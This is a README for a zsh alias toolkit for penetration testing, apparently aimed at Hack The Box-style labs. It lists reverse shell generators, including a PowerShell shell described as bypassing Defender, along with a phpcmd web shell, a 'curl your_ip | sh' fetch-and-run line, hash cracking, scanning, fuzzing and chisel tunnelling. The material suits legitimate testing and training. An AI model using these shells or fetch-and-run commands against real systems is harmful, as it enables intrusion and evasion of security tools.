# Penetration Testing Toolkit & Aliases (Tmux Edition)

This toolkit is optimized **exclusively for tmux users** and designed to streamline penetration testing workflows with powerful aliases and automation.

It enhances productivity inside tmux sessions with improved window management, reverse shell generation, scanning helpers, and quick utilities tailored for real-world engagements.

---

## Installation

```bash
cd ~
git clone https://github.com/jaytiwari05/zsh-aliases.git
cd zsh-aliases

# Add to your shell configuration
echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc

# Reload shell
source ~/.zshrc

# Start using it
start_htb
```

You can now run the toolkit from anywhere.

---

## Quick Verification

```bash
cd ~/zsh-aliases
git branch
```

You should see:

```
* main
```

Test some aliases:

```bash
www
tun0
uptty
```

---

# Core Features

## 🚀 Misc Utilities

### www

Starts an HTTP server on port 80 in the current directory and displays network info.

```bash
www
```

> Uses sudo for port 80 binding.

---

### tun0

Copies the IP address of the tun0 interface to clipboard.

```bash
tun0
```

---

### mkdir_cd

Create a directory and immediately enter it.

```bash
mkdir_cd target
```

---

# 🔄 Reverse Shell Generators

### gen_lin_rev $ip $port

Generates multi-payload reverse shell HTML page for Linux targets.

```bash
gen_lin_rev 10.10.14.10 1337
```

Perfect for:

```
curl your_ip | sh
```

---

### gen_php_rev $ip $port

Generates PentestMonkey PHP reverse shell.

```bash
gen_php_rev 10.10.14.10 1337
```

---

### gen_ps_rev $ip $port

Generates Defender-bypassing PowerShell reverse shell and copies it to clipboard.

```bash
gen_ps_rev 10.10.14.10 1337
```

---

# 🖥️ TTY Upgrades

### uptty

Copies Python TTY upgrade commands to clipboard.

```bash
uptty
```

---

### script_tty_upgrade

TTY upgrade alternative when Python isn’t available.

```bash
script_tty_upgrade
```

---

### tty_fix

Fixes TTY after backgrounding:

```
stty raw -echo; fg; reset
```

---


# 🔓 Hash Cracking

### rock_john $hash_file

Runs JohnTheRipper with rockyou wordlist pre-configured.

```bash
rock_john hash.txt --format=Raw-MD5
```

---

# 🔍 Port Scanning

### nmap_tcp $ip

Optimized TCP scan with organized output.

```bash
nmap_tcp 10.10.10.10
```

Use `-p-` for all ports.

---

### nmap_udp $ip

UDP scanning with same workflow.

```bash
nmap_udp 10.10.10.10
```

---

# 🌐 Web Fuzzing

### vhost $domain

Virtual host discovery using ffuf.

```bash
vhost box.htb
```

---

### fuzz_dir $url

Directory and file fuzzing.

```bash
fuzz_dir http://box.htb
```

---

# 🔌 Chisel Tunneling

### chisel_socks $ip $port

Sets up SOCKS proxy and copies client command.

```bash
chisel_socks 10.10.14.10 8888
```

---

### chisel_forward

Simple port forwarding.

```bash
chisel_forward 10.10.14.10 8080 127.0.0.1 8080
```

---

# 🖥️ Host Management

### addhost $ip $hostname

Efficient `/etc/hosts` management.

```bash
addhost 10.10.11.234 big.box.htb
```

---

# Additional Tools

* linpeas downloader
* upload (bashupload.com)
* phpcmd web shell
* burl (curl via Burp proxy)

---

# SecLists Integration

Automatically checks:

* `/opt/seclists/`
* `/usr/share/seclists/`
* `$SECLISTS_PATH`

Optional:

```bash
export SECLISTS_PATH="/path/to/seclists"
```

---

# Tmux Integration

This toolkit is designed specifically for tmux workflows:

* Optimized pane usage
* Session-aware scripting
* SSH-friendly
* Efficient remote engagement setup
* Improved multi-window management

Best suited for heavy CLI users and remote penetration testing environments.

---

# Troubleshooting

Aliases not working?

* Ensure `source ~/zsh-aliases/aliases.zsh` is in `.zshrc`
* Restart terminal or run:

```bash
source ~/.zshrc
```

---

# Disclaimer

These aliases were built for speed and practicality during engagements.
If it works, it ships 😄

Pull requests are welcome.

---
